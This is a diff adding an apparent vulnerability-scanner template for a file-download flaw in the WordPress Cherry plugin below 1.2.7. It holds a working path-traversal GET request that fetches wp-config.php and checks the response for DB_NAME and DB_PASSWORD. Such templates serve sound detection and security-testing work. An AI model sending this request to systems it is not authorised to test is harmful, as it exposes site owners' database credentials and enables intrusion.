@@ -1,0 +1,28 @@
+id: cherry-lfi
+brief:
+    title: WordPress Cherry < 1.2.7 - Unauthenticated Arbitrary File Upload and Download
+    by: dhiyaneshDK
+    level: high
+    about: WordPress plugin Cherry < 1.2.7 has a vulnerability which enables an attacker to upload files directly to the server. This could result in attacker uploading backdoor shell scripts or downloading t...
+    label:
+        - wpscan
+        - wordpress
+        - wp-plugin
+        - lfi
+        - wp
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php'
+      signs:
+        - "on": word
+          has:
+            - DB_NAME
+            - DB_PASSWORD
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
